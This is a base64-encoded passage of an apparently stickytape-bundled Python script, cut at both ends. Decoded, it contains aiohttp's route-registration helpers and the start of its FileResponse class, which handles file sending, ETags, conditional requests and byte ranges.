ZXJdID0gTm9uZSxcclxuICAgICAgICBjaHVua19zaXplOiBpbnQgPSAyNTYgKiAxMDI0LFxyXG4gICAgICAgIHNob3dfaW5kZXg6IGJvb2wgPSBGYWxzZSxcclxuICAgICAgICBmb2xsb3dfc3ltbGlua3M6IGJvb2wgPSBGYWxzZSxcclxuICAgICAgICBhcHBlbmRfdmVyc2lvbjogYm9vbCA9IEZhbHNlLFxyXG4gICAgKSAtPiBBYnN0cmFjdFJlc291cmNlOlxyXG4gICAgICAgICIiIkFkZCBzdGF0aWMgZmlsZXMgdmlldy5cclxuXHJcbiAgICAgICAgcHJlZml4IC0gdXJsIHByZWZpeFxyXG4gICAgICAgIHBhdGggLSBmb2xkZXIgd2l0aCBmaWxlc1xyXG5cclxuICAgICAgICAiIiJcclxuICAgICAgICBhc3NlcnQgcHJlZml4LnN0YXJ0c3dpdGgoIi8iKVxyXG4gICAgICAgIGlmIHByZWZpeC5lbmRzd2l0aCgiLyIpOlxyXG4gICAgICAgICAgICBwcmVmaXggPSBwcmVmaXhbOi0xXVxyXG4gICAgICAgIHJlc291cmNlID0gU3RhdGljUmVzb3VyY2UoXHJcbiAgICAgICAgICAgIHByZWZpeCxcclxuICAgICAgICAgICAgcGF0aCxcclxuICAgICAgICAgICAgbmFtZT1uYW1lLFxyXG4gICAgICAgICAgICBleHBlY3RfaGFuZGxlcj1leHBlY3RfaGFuZGxlcixcclxuICAgICAgICAgICAgY2h1bmtfc2l6ZT1jaHVua19zaXplLFxyXG4gICAgICAgICAgICBzaG93X2luZGV4PXNob3dfaW5kZXgsXHJcbiAgICAgICAgICAgIGZvbGxvd19zeW1saW5rcz1mb2xsb3dfc3ltbGlua3MsXHJcbiAgICAgICAgICAgIGFwcGVuZF92ZXJzaW9uPWFwcGVuZF92ZXJzaW9uLFxyXG4gICAgICAgIClcclxuICAgICAgICBzZWxmLnJlZ2lzdGVyX3Jlc291cmNlKHJlc291cmNlKVxyXG4gICAgICAgIHJldHVybiByZXNvdXJjZVxyXG5cclxuICAgIGRlZiBhZGRfaGVhZChzZWxmLCBwYXRoOiBzdHIsIGhhbmRsZXI6IEhhbmRsZXIsICoqa3dhcmdzOiBBbnkpIC0+IEFic3RyYWN0Um91dGU6XHJcbiAgICAgICAgIiIiU2hvcnRjdXQgZm9yIGFkZF9yb3V0ZSB3aXRoIG1ldGhvZCBIRUFELiIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLmFkZF9yb3V0ZShoZHJzLk1FVEhfSEVBRCwgcGF0aCwgaGFuZGxlciwgKiprd2FyZ3MpXHJcblxyXG4gICAgZGVmIGFkZF9vcHRpb25zKHNlbGYsIHBhdGg6IHN0ciwgaGFuZGxlcjogSGFuZGxlciwgKiprd2FyZ3M6IEFueSkgLT4gQWJzdHJhY3RSb3V0ZTpcclxuICAgICAgICAiIiJTaG9ydGN1dCBmb3IgYWRkX3JvdXRlIHdpdGggbWV0aG9kIE9QVElPTlMuIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuYWRkX3JvdXRlKGhkcnMuTUVUSF9PUFRJT05TLCBwYXRoLCBoYW5kbGVyLCAqKmt3YXJncylcclxuXHJcbiAgICBkZWYgYWRkX2dldChcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHBhdGg6IHN0cixcclxuICAgICAgICBoYW5kbGVyOiBIYW5kbGVyLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgbmFtZTogT3B0aW9uYWxbc3RyXSA9IE5vbmUsXHJcbiAgICAgICAgYWxsb3dfaGVhZDogYm9vbCA9IFRydWUsXHJcbiAgICAgICAgKiprd2FyZ3M6IEFueSxcclxuICAgICkgLT4gQWJzdHJhY3RSb3V0ZTpcclxuICAgICAgICAiIiJTaG9ydGN1dCBmb3IgYWRkX3JvdXRlIHdpdGggbWV0aG9kIEdFVC5cclxuXHJcbiAgICAgICAgSWYgYWxsb3dfaGVhZCBpcyB0cnVlLCBhbm90aGVyXHJcbiAgICAgICAgcm91dGUgaXMgYWRkZWQgYWxsb3dpbmcgaGVhZCByZXF1ZXN0cyB0byB0aGUgc2FtZSBlbmRwb2ludC5cclxuICAgICAgICAiIiJcclxuICAgICAgICByZXNvdXJjZSA9IHNlbGYuYWRkX3Jlc291cmNlKHBhdGgsIG5hbWU9bmFtZSlcclxuICAgICAgICBpZiBhbGxvd19oZWFkOlxyXG4gICAgICAgICAgICByZXNvdXJjZS5hZGRfcm91dGUoaGRycy5NRVRIX0hFQUQsIGhhbmRsZXIsICoqa3dhcmdzKVxyXG4gICAgICAgIHJldHVybiByZXNvdXJjZS5hZGRfcm91dGUoaGRycy5NRVRIX0dFVCwgaGFuZGxlciwgKiprd2FyZ3MpXHJcblxyXG4gICAgZGVmIGFkZF9wb3N0KHNlbGYsIHBhdGg6IHN0ciwgaGFuZGxlcjogSGFuZGxlciwgKiprd2FyZ3M6IEFueSkgLT4gQWJzdHJhY3RSb3V0ZTpcclxuICAgICAgICAiIiJTaG9ydGN1dCBmb3IgYWRkX3JvdXRlIHdpdGggbWV0aG9kIFBPU1QuIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuYWRkX3JvdXRlKGhkcnMuTUVUSF9QT1NULCBwYXRoLCBoYW5kbGVyLCAqKmt3YXJncylcclxuXHJcbiAgICBkZWYgYWRkX3B1dChzZWxmLCBwYXRoOiBzdHIsIGhhbmRsZXI6IEhhbmRsZXIsICoqa3dhcmdzOiBBbnkpIC0+IEFic3RyYWN0Um91dGU6XHJcbiAgICAgICAgIiIiU2hvcnRjdXQgZm9yIGFkZF9yb3V0ZSB3aXRoIG1ldGhvZCBQVVQuIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuYWRkX3JvdXRlKGhkcnMuTUVUSF9QVVQsIHBhdGgsIGhhbmRsZXIsICoqa3dhcmdzKVxyXG5cclxuICAgIGRlZiBhZGRfcGF0Y2goc2VsZiwgcGF0aDogc3RyLCBoYW5kbGVyOiBIYW5kbGVyLCAqKmt3YXJnczogQW55KSAtPiBBYnN0cmFjdFJvdXRlOlxyXG4gICAgICAgICIiIlNob3J0Y3V0IGZvciBhZGRfcm91dGUgd2l0aCBtZXRob2QgUEFUQ0guIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuYWRkX3JvdXRlKGhkcnMuTUVUSF9QQVRDSCwgcGF0aCwgaGFuZGxlciwgKiprd2FyZ3MpXHJcblxyXG4gICAgZGVmIGFkZF9kZWxldGUoc2VsZiwgcGF0aDogc3RyLCBoYW5kbGVyOiBIYW5kbGVyLCAqKmt3YXJnczogQW55KSAtPiBBYnN0cmFjdFJvdXRlOlxyXG4gICAgICAgICIiIlNob3J0Y3V0IGZvciBhZGRfcm91dGUgd2l0aCBtZXRob2QgREVMRVRFLiIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLmFkZF9yb3V0ZShoZHJzLk1FVEhfREVMRVRFLCBwYXRoLCBoYW5kbGVyLCAqKmt3YXJncylcclxuXHJcbiAgICBkZWYgYWRkX3ZpZXcoXHJcbiAgICAgICAgc2VsZiwgcGF0aDogc3RyLCBoYW5kbGVyOiBUeXBlW0Fic3RyYWN0Vmlld10sICoqa3dhcmdzOiBBbnlcclxuICAgICkgLT4gQWJzdHJhY3RSb3V0ZTpcclxuICAgICAgICAiIiJTaG9ydGN1dCBmb3IgYWRkX3JvdXRlIHdpdGggQU5ZIG1ldGhvZHMgZm9yIGEgY2xhc3MtYmFzZWQgdmlldy4iIiJcclxuICAgICAgICByZXR1cm4gc2VsZi5hZGRfcm91dGUoaGRycy5NRVRIX0FOWSwgcGF0aCwgaGFuZGxlciwgKiprd2FyZ3MpXHJcblxyXG4gICAgZGVmIGZyZWV6ZShzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIHN1cGVyKCkuZnJlZXplKClcclxuICAgICAgICBmb3IgcmVzb3VyY2UgaW4gc2VsZi5fcmVzb3VyY2VzOlxyXG4gICAgICAgICAgICByZXNvdXJjZS5mcmVlemUoKVxyXG5cclxuICAgIGRlZiBhZGRfcm91dGVzKHNlbGYsIHJvdXRlczogSXRlcmFibGVbQWJzdHJhY3RSb3V0ZURlZl0pIC0+IExpc3RbQWJzdHJhY3RSb3V0ZV06XHJcbiAgICAgICAgIiIiQXBwZW5kIHJvdXRlcyB0byByb3V0ZSB0YWJsZS5cclxuXHJcbiAgICAgICAgUGFyYW1ldGVyIHNob3VsZCBiZSBhIHNlcXVlbmNlIG9mIFJvdXRlRGVmIG9iamVjdHMuXHJcblxyXG4gICAgICAgIFJldHVybnMgYSBsaXN0IG9mIHJlZ2lzdGVyZWQgQWJzdHJhY3RSb3V0ZSBpbnN0YW5jZXMuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmVnaXN0ZXJlZF9yb3V0ZXMgPSBbXVxyXG4gICAgICAgIGZvciByb3V0ZV9kZWYgaW4gcm91dGVzOlxyXG4gICAgICAgICAgICByZWdpc3RlcmVkX3JvdXRlcy5leHRlbmQocm91dGVfZGVmLnJlZ2lzdGVyKHNlbGYpKVxyXG4gICAgICAgIHJldHVybiByZWdpc3RlcmVkX3JvdXRlc1xyXG5cclxuXHJcbmRlZiBfcXVvdGVfcGF0aCh2YWx1ZTogc3RyKSAtPiBzdHI6XHJcbiAgICBpZiBZQVJMX1ZFUlNJT04gPCAoMSwgNik6XHJcbiAgICAgICAgdmFsdWUgPSB2YWx1ZS5yZXBsYWNlKCIlIiwgIiUyNSIpXHJcbiAgICByZXR1cm4gVVJMLmJ1aWxkKHBhdGg9dmFsdWUsIGVuY29kZWQ9RmFsc2UpLnJhd19wYXRoXHJcblxyXG5cclxuZGVmIF91bnF1b3RlX3BhdGgodmFsdWU6IHN0cikgLT4gc3RyOlxyXG4gICAgcmV0dXJuIFVSTC5idWlsZChwYXRoPXZhbHVlLCBlbmNvZGVkPVRydWUpLnBhdGhcclxuXHJcblxyXG5kZWYgX3JlcXVvdGVfcGF0aCh2YWx1ZTogc3RyKSAtPiBzdHI6XHJcbiAgICAjIFF1b3RlIG5vbi1hc2NpaSBjaGFyYWN0ZXJzIGFuZCBvdGhlciBjaGFyYWN0ZXJzIHdoaWNoIG11c3QgYmUgcXVvdGVkLFxyXG4gICAgIyBidXQgcHJlc2VydmUgZXhpc3RpbmcgJS1zZXF1ZW5jZXMuXHJcbiAgICByZXN1bHQgPSBfcXVvdGVfcGF0aCh2YWx1ZSlcclxuICAgIGlmICIlIiBpbiB2YWx1ZTpcclxuICAgICAgICByZXN1bHQgPSByZXN1bHQucmVwbGFjZSgiJTI1IiwgIiUiKVxyXG4gICAgcmV0dXJuIHJlc3VsdFxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvaHR0cC93ZWJfZmlsZXJlc3BvbnNlLnB5JywgYidpbXBvcnQgYXN5bmNpb1xyXG5pbXBvcnQgbWltZXR5cGVzXHJcbmltcG9ydCBvc1xyXG5pbXBvcnQgcGF0aGxpYlxyXG5pbXBvcnQgc3lzXHJcbmZyb20gdHlwaW5nIGltcG9ydCAoICAjIG5vcWFcclxuICAgIElPLFxyXG4gICAgVFlQRV9DSEVDS0lORyxcclxuICAgIEFueSxcclxuICAgIEF3YWl0YWJsZSxcclxuICAgIENhbGxhYmxlLFxyXG4gICAgSXRlcmF0b3IsXHJcbiAgICBMaXN0LFxyXG4gICAgT3B0aW9uYWwsXHJcbiAgICBUdXBsZSxcclxuICAgIFVuaW9uLFxyXG4gICAgY2FzdCxcclxuKVxyXG5cclxuZnJvbSAuIGltcG9ydCBoZHJzXHJcbmZyb20gLmFiYyBpbXBvcnQgQWJzdHJhY3RTdHJlYW1Xcml0ZXJcclxuZnJvbSAuaGVscGVycyBpbXBvcnQgRVRBR19BTlksIEVUYWdcclxuZnJvbSAudHlwZWRlZnMgaW1wb3J0IEZpbmFsLCBMb29zZUhlYWRlcnNcclxuZnJvbSAud2ViX2V4Y2VwdGlvbnMgaW1wb3J0IChcclxuICAgIEhUVFBOb3RNb2RpZmllZCxcclxuICAgIEhUVFBQYXJ0aWFsQ29udGVudCxcclxuICAgIEhUVFBQcmVjb25kaXRpb25GYWlsZWQsXHJcbiAgICBIVFRQUmVxdWVzdFJhbmdlTm90U2F0aXNmaWFibGUsXHJcbilcclxuZnJvbSAud2ViX3Jlc3BvbnNlIGltcG9ydCBTdHJlYW1SZXNwb25zZVxyXG5cclxuX19hbGxfXyA9ICgiRmlsZVJlc3BvbnNlIiwpXHJcblxyXG5pZiBUWVBFX0NIRUNLSU5HOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICBmcm9tIC53ZWJfcmVxdWVzdCBpbXBvcnQgQmFzZVJlcXVlc3RcclxuXHJcblxyXG5fVF9PbkNodW5rU2VudCA9IE9wdGlvbmFsW0NhbGxhYmxlW1tieXRlc10sIEF3YWl0YWJsZVtOb25lXV1dXHJcblxyXG5cclxuTk9TRU5ERklMRTogRmluYWxbYm9vbF0gPSBib29sKG9zLmVudmlyb24uZ2V0KCJBSU9IVFRQX05PU0VOREZJTEUiKSlcclxuXHJcblxyXG5jbGFzcyBGaWxlUmVzcG9uc2UoU3RyZWFtUmVzcG9uc2UpOlxyXG4gICAgIiIiQSByZXNwb25zZSBvYmplY3QgY2FuIGJlIHVzZWQgdG8gc2VuZCBmaWxlcy4iIiJcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBwYXRoOiBVbmlvbltzdHIsIHBhdGhsaWIuUGF0aF0sXHJcbiAgICAgICAgY2h1bmtfc2l6ZTogaW50ID0gMjU2ICogMTAyNCxcclxuICAgICAgICBzdGF0dXM6IGludCA9IDIwMCxcclxuICAgICAgICByZWFzb246IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgICAgIGhlYWRlcnM6IE9wdGlvbmFsW0xvb3NlSGVhZGVyc10gPSBOb25lLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18oc3RhdHVzPXN0YXR1cywgcmVhc29uPXJlYXNvbiwgaGVhZGVycz1oZWFkZXJzKVxyXG5cclxuICAgICAgICBpZiBpc2luc3RhbmNlKHBhdGgsIHN0cik6XHJcbiAgICAgICAgICAgIHBhdGggPSBwYXRobGliLlBhdGgocGF0aClcclxuXHJcbiAgICAgICAgc2VsZi5fcGF0aCA9IHBhdGhcclxuICAgICAgICBzZWxmLl9jaHVua19zaXplID0gY2h1bmtfc2l6ZVxyXG5cclxuICAgIGFzeW5jIGRlZiBfc2VuZGZpbGVfZmFsbGJhY2soXHJcbiAgICAgICAgc2VsZiwgd3JpdGVyOiBBYnN0cmFjdFN0cmVhbVdyaXRlciwgZm9iajogSU9bQW55XSwgb2Zmc2V0OiBpbnQsIGNvdW50OiBpbnRcclxuICAgICkgLT4gQWJzdHJhY3RTdHJlYW1Xcml0ZXI6XHJcbiAgICAgICAgIyBUbyBrZWVwIG1lbW9yeSB1c2FnZSBsb3csZm9iaiBpcyB0cmFuc2ZlcnJlZCBpbiBjaHVua3NcclxuICAgICAgICAjIGNvbnRyb2xsZWQgYnkgdGhlIGNvbnN0cnVjdG9yXCdzIGNodW5rX3NpemUgYXJndW1lbnQuXHJcblxyXG4gICAgICAgIGNodW5rX3NpemUgPSBzZWxmLl9jaHVua19zaXplXHJcbiAgICAgICAgbG9vcCA9IGFzeW5jaW8uZ2V0X2V2ZW50X2xvb3AoKVxyXG5cclxuICAgICAgICBhd2FpdCBsb29wLnJ1bl9pbl9leGVjdXRvcihOb25lLCBmb2JqLnNlZWssIG9mZnNldClcclxuXHJcbiAgICAgICAgY2h1bmsgPSBhd2FpdCBsb29wLnJ1bl9pbl9leGVjdXRvcihOb25lLCBmb2JqLnJlYWQsIGNodW5rX3NpemUpXHJcbiAgICAgICAgd2hpbGUgY2h1bms6XHJcbiAgICAgICAgICAgIGF3YWl0IHdyaXRlci53cml0ZShjaHVuaylcclxuICAgICAgICAgICAgY291bnQgPSBjb3VudCAtIGNodW5rX3NpemVcclxuICAgICAgICAgICAgaWYgY291bnQgPD0gMDpcclxuICAgICAgICAgICAgICAgIGJyZWFrXHJcbiAgICAgICAgICAgIGNodW5rID0gYXdhaXQgbG9vcC5ydW5faW5fZXhlY3V0b3IoTm9uZSwgZm9iai5yZWFkLCBtaW4oY2h1bmtfc2l6ZSwgY291bnQpKVxyXG5cclxuICAgICAgICBhd2FpdCB3cml0ZXIuZHJhaW4oKVxyXG4gICAgICAgIHJldHVybiB3cml0ZXJcclxuXHJcbiAgICBhc3luYyBkZWYgX3NlbmRmaWxlKFxyXG4gICAgICAgIHNlbGYsIHJlcXVlc3Q6ICJCYXNlUmVxdWVzdCIsIGZvYmo6IElPW0FueV0sIG9mZnNldDogaW50LCBjb3VudDogaW50XHJcbiAgICApIC0+IEFic3RyYWN0U3RyZWFtV3JpdGVyOlxyXG4gICAgICAgIHdyaXRlciA9IGF3YWl0IHN1cGVyKCkucHJlcGFyZShyZXF1ZXN0KVxyXG4gICAgICAgIGFzc2VydCB3cml0ZXIgaXMgbm90IE5vbmVcclxuXHJcbiAgICAgICAgaWYgTk9TRU5ERklMRSBvciBzeXMudmVyc2lvbl9pbmZvIDwgKDMsIDcpIG9yIHNlbGYuY29tcHJlc3Npb246XHJcbiAgICAgICAgICAgIHJldHVybiBhd2FpdCBzZWxmLl9zZW5kZmlsZV9mYWxsYmFjayh3cml0ZXIsIGZvYmosIG9mZnNldCwgY291bnQpXHJcblxyXG4gICAgICAgIGxvb3AgPSByZXF1ZXN0Ll9sb29wXHJcbiAgICAgICAgdHJhbnNwb3J0ID0gcmVxdWVzdC50cmFuc3BvcnRcclxuICAgICAgICBhc3NlcnQgdHJhbnNwb3J0IGlzIG5vdCBOb25lXHJcblxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgYXdhaXQgbG9vcC5zZW5kZmlsZSh0cmFuc3BvcnQsIGZvYmosIG9mZnNldCwgY291bnQpXHJcbiAgICAgICAgZXhjZXB0IE5vdEltcGxlbWVudGVkRXJyb3I6XHJcbiAgICAgICAgICAgIHJldHVybiBhd2FpdCBzZWxmLl9zZW5kZmlsZV9mYWxsYmFjayh3cml0ZXIsIGZvYmosIG9mZnNldCwgY291bnQpXHJcblxyXG4gICAgICAgIGF3YWl0IHN1cGVyKCkud3JpdGVfZW9mKClcclxuICAgICAgICByZXR1cm4gd3JpdGVyXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIF9zdHJvbmdfZXRhZ19tYXRjaChldGFnX3ZhbHVlOiBzdHIsIGV0YWdzOiBUdXBsZVtFVGFnLCAuLi5dKSAtPiBib29sOlxyXG4gICAgICAgIGlmIGxlbihldGFncykgPT0gMSBhbmQgZXRhZ3NbMF0udmFsdWUgPT0gRVRBR19BTlk6XHJcbiAgICAgICAgICAgIHJldHVybiBUcnVlXHJcbiAgICAgICAgcmV0dXJuIGFueShldGFnLnZhbHVlID09IGV0YWdfdmFsdWUgZm9yIGV0YWcgaW4gZXRhZ3MgaWYgbm90IGV0YWcuaXNfd2VhaylcclxuXHJcbiAgICBhc3luYyBkZWYgX25vdF9tb2RpZmllZChcclxuICAgICAgICBzZWxmLCByZXF1ZXN0OiAiQmFzZVJlcXVlc3QiLCBldGFnX3ZhbHVlOiBzdHIsIGxhc3RfbW9kaWZpZWQ6IGZsb2F0XHJcbiAgICApIC0+IE9wdGlvbmFsW0Fic3RyYWN0U3RyZWFtV3JpdGVyXTpcclxuICAgICAgICBzZWxmLnNldF9zdGF0dXMoSFRUUE5vdE1vZGlmaWVkLnN0YXR1c19jb2RlKVxyXG4gICAgICAgIHNlbGYuX2xlbmd0aF9jaGVjayA9IEZhbHNlXHJcbiAgICAgICAgc2VsZi5ldGFnID0gZXRhZ192YWx1ZSAgIyB0eXBlOiBpZ25vcmVbYXNzaWdubWVudF1cclxuICAgICAgICBzZWxmLmxhc3RfbW9kaWZpZWQgPSBsYXN0X21vZGlmaWVkICAjIHR5cGU6IGlnbm9yZVthc3NpZ25tZW50XVxyXG4gICAgICAgICMgRGVsZXRlIGFueSBDb250ZW50LUxlbmd0aCBoZWFkZXJzIHByb3ZpZGVkIGJ5IHVzZXIuIEhUVFAgMzA0XHJcbiAgICAgICAgIyBzaG91bGQgYWx3YXlzIGhhdmUgZW1wdHkgcmVzcG9uc2UgYm9keVxyXG4gICAgICAgIHJldHVybiBhd2FpdCBzdXBlcigpLnByZXBhcmUocmVxdWVzdClcclxuXHJcbiAgICBhc3luYyBkZWYgX3ByZWNvbmRpdGlvbl9mYWlsZWQoXHJcbiAgICAgICAgc2VsZiwgcmVxdWVzdDogIkJhc2VSZXF1ZXN0IlxyXG4gICAgKSAtPiBPcHRpb25hbFtBYnN0cmFjdFN0cmVhbVdyaXRlcl06XHJcbiAgICAgICAgc2VsZi5zZXRfc3RhdHVzKEhUVFBQcmVjb25kaXRpb25GYWlsZWQuc3RhdHVzX2NvZGUpXHJcbiAgICAgICAgc2VsZi5jb250ZW50X2xlbmd0aCA9IDBcclxuICAgICAgICByZXR1cm4gYXdhaXQgc3VwZXIoKS5wcmVwYXJlKHJlcXVlc3QpXHJcblxyXG4gICAgYXN5bmMgZGVmIHByZXBhcmUoc2VsZiwgcmVxdWVzdDogIkJhc2VSZXF1ZXN0IikgLT4gT3B0aW9uYWxbQWJzdHJhY3RTdHJlYW1Xcml0ZXJdOlxyXG4gICAgICAgIGZpbGVwYXRoID0gc2VsZi5fcGF0aFxyXG5cclxuICAgICAgICBnemlwID0gRmFsc2VcclxuICAgICAgICBpZiAiZ3ppcCIgaW4gcmVxdWVzdC5oZWFkZXJzLmdldChoZHJzLkFDQ0VQVF9FTkNPRElORywgIiIpOlxyXG4gICAgICAgICAgICBnemlwX3BhdGggPSBmaWxlcGF0aC53aXRoX25hbWUoZmlsZXBhdGgubmFtZSArICIuZ3oiKVxyXG5cclxuICAgICAgICAgICAgaWYgZ3ppcF9wYXRoLmlzX2ZpbGUoKTpcclxuICAgICAgICAgICAgICAgIGZpbGVwYXRoID0gZ3ppcF9wYXRoXHJcbiAgICAgICAgICAgICAgICBnemlwID0gVHJ1ZVxyXG5cclxuICAgICAgICBsb29wID0gYXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpXHJcbiAgICAgICAgc3Q6IG9zLnN0YXRfcmVzdWx0ID0gYXdhaXQgbG9vcC5ydW5faW5fZXhlY3V0b3IoTm9uZSwgZmlsZXBhdGguc3RhdClcclxuXHJcbiAgICAgICAgZXRhZ192YWx1ZSA9IGYie3N0LnN0X210aW1lX25zOnh9LXtzdC5zdF9zaXplOnh9IlxyXG4gICAgICAgIGxhc3RfbW9kaWZpZWQgPSBzdC5zdF9tdGltZVxyXG5cclxuICAgICAgICAjIGh0dHBzOi8vdG9vbHMuaWV0Zi5vcmcvaHRtbC9yZmM3MjMyI3NlY3Rpb24tNlxyXG4gICAgICAgIGlmbWF0Y2ggPSByZXF1ZXN0LmlmX21hdGNoXHJcbiAgICAgICAgaWYgaWZtYXRjaCBpcyBub3QgTm9uZSBhbmQgbm90IHNlbGYuX3N0cm9uZ19ldGFnX21hdGNoKGV0YWdfdmFsdWUsIGlmbWF0Y2gpOlxyXG4gICAgICAgICAgICByZXR1cm4gYXdhaXQgc2VsZi5fcHJlY29uZGl0aW9uX2ZhaWxlZChyZXF1ZXN0KVxyXG5cclxuICAgICAgICB1bm1vZHNpbmNlID0gcmVxdWVzdC5pZl91bm1vZGlmaWVkX3NpbmNlXHJcbiAgICAgICAgaWYgKFxyXG4gICAgICAgICAgICB1bm1vZHNpbmNlIGlzIG5vdCBOb25lXHJcbiAgICAgICAgICAgIGFuZCBpZm1hdGNoIGlzIE5vbmVcclxuICAgICAgICAgICAgYW5kIHN0LnN0X210aW1lID4gdW5tb2RzaW5jZS50aW1lc3RhbXAoKVxyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIHJldHVybiBhd2FpdCBzZWxmLl9wcmVjb25kaXRpb25fZmFpbGVkKHJlcXVlc3QpXHJcblxyXG4gICAgICAgIGlmbm9uZW1hdGNoID0gcmVxdWVzdC5pZl9ub25lX21hdGNoXHJcbiAgICAgICAgaWYgaWZub25lbWF0Y2ggaXMgbm90IE5vbmUgYW5kIHNlbGYuX3N0cm9uZ19ldGFnX21hdGNoKGV0YWdfdmFsdWUsIGlmbm9uZW1hdGNoKTpcclxuICAgICAgICAgICAgcmV0dXJuIGF3YWl0IHNlbGYuX25vdF9tb2RpZmllZChyZXF1ZXN0LCBldGFnX3ZhbHVlLCBsYXN0X21vZGlmaWVkKVxyXG5cclxuICAgICAgICBtb2RzaW5jZSA9IHJlcXVlc3QuaWZfbW9kaWZpZWRfc2luY2VcclxuICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgIG1vZHNpbmNlIGlzIG5vdCBOb25lXHJcbiAgICAgICAgICAgIGFuZCBpZm5vbmVtYXRjaCBpcyBOb25lXHJcbiAgICAgICAgICAgIGFuZCBzdC5zdF9tdGltZSA8PSBtb2RzaW5jZS50aW1lc3RhbXAoKVxyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIHJldHVybiBhd2FpdCBzZWxmLl9ub3RfbW9kaWZpZWQocmVxdWVzdCwgZXRhZ192YWx1ZSwgbGFzdF9tb2RpZmllZClcclxuXHJcbiAgICAgICAgaWYgaGRycy5DT05URU5UX1RZUEUgbm90IGluIHNlbGYuaGVhZGVyczpcclxuICAgICAgICAgICAgY3QsIGVuY29kaW5nID0gbWltZXR5cGVzLmd1ZXNzX3R5cGUoc3RyKGZpbGVwYXRoKSlcclxuICAgICAgICAgICAgaWYgbm90IGN0OlxyXG4gICAgICAgICAgICAgICAgY3QgPSAiYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtIlxyXG4gICAgICAgICAgICBzaG91bGRfc2V0X2N0ID0gVHJ1ZVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIGVuY29kaW5nID0gImd6aXAiIGlmIGd6aXAgZWxzZSBOb25lXHJcbiAgICAgICAgICAgIHNob3VsZF9zZXRfY3QgPSBGYWxzZVxyXG5cclxuICAgICAgICBzdGF0dXMgPSBzZWxmLl9zdGF0dXNcclxuICAgICAgICBmaWxlX3NpemUgPSBzdC5zdF9zaXplXHJcbiAgICAgICAgY291bnQgPSBmaWxlX3NpemVcclxuXHJcbiAgICAgICAgc3RhcnQgPSBOb25lXHJcblxyXG4gICAgICAgIGlmcmFuZ2UgPSByZXF1ZXN0LmlmX3JhbmdlXHJcbiAgICAgICAgaWYgaWZyYW5nZSBpcyBOb25lIG9yIHN0LnN0X210aW1lIDw9IGlmcmFuZ2UudGltZXN0YW1wKCk6XHJcbiAgICAgICAgICAgICMgSWYtUmFuZ2UgaGVhZGVyIGNoZWNrOlxyXG4gICAgICAgICAgICAjIGNvbmRpdGlvbiA9IGNhY2hlZCBkYXRlID49IGxhc3QgbW9kaWZpY2F0aW9uIGRhdGVcclxuICAgICAgICAgICAgIyByZXR1cm4gMjA2IGlmIFRydWUgZWxzZSAyMDAuXHJcbiAgICAgICAgICAgICMgaWYgRmFsc2U6XHJcbiAgICAgICAgICAgICMgICBSYW5nZSBoZWFkZXIgd291bGQgbm90IGJlIHByb2Nlc3NlZCwgcmV0dXJuIDIwMFxyXG4gICAgICAgICAgICAjIGlmIFRydWUgYnV0IFJhbmdlIGhlYWRlciBtaXNzaW5nXHJcbiAgICAgICAgICAgICMgICByZXR1cm4gMjAwXHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIHJuZyA9IHJlcXVlc3QuaHR0cF9yYW5nZVxyXG4gICAgICAgICAgICAgICAgc3RhcnQgPSBybmcuc3RhcnRcclxuICAgICAgICAgICAgICAgIGVuZCA9IHJuZy5zdG9wXHJcbiAgICAgICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOlxyXG4gICAgICAgICAgICAgICAgIyBodHRwczovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZjNzIzMzpcclxuICAgICAgICAgICAgICAgICMgQSBzZXJ2ZXIgZ2VuZXJhdGluZyBhIDQxNiAoUmFuZ2UgTm90IFNhdGlzZmlhYmxlKSByZXNwb25zZSB0b1xyXG4gICAgICAgICAgICAgICAgIyBhIGJ5dGUtcmFuZ2UgcmVxdWVzdCBTSE9VTEQgc2VuZCBhIENvbnRlbnQtUmFuZ2UgaGVhZGVyIGZpZWxkXHJcbiAgICAgICAgICAgICAgICAjIHdpdGggYW4gdW5zYXRpc2ZpZWQtcmFuZ2UgdmFsdWUuXHJcbiAgICAgICAgICAgICAgICAjIFRoZSBjb21wbGV0ZS1sZW5ndGggaW4gYSA0MTYgcmVzcG9uc2UgaW5kaWNhdGVzIHRoZSBjdXJyZW50XHJcbiAgICAgICAgICAgICAgICAjIGxlbmd0aCBvZiB0aGUgc2VsZWN0ZWQgcmVwcmVzZW50YXRpb24uXHJcbiAgICAgICAgICAgICAgICAjXHJcbiAgICAgICAgICAgICAgICAjIFdpbGwgZG8gdGhlIHNhbWUgYmVsb3cuIE1hbnkgc2VydmVycyBpZ25vcmUgdGhpcyBhbmQgZG8gbm90XHJcbiAgICAgICAgICAgICAgICAjIHNlbmQgYSBDb250ZW50LVJhbmdlIGhlYWRlciB3aXRoIEhUVFAgNDE2XHJcbiAgICAgICAgICAgICAgICBzZWxmLmhlYWRlcnNbaGRycy5DT05URU5UX1JBTkdFXSA9IGYiYnl0ZXMgKi97ZmlsZV9zaXplfSJcclxuICAgICAgICAgICAgICAgIHNlbGYuc2V0X3N0YXR1cyhIVFRQUmVxdWVzdFJhbmdlTm90U2F0aXNmaWFibGUuc3R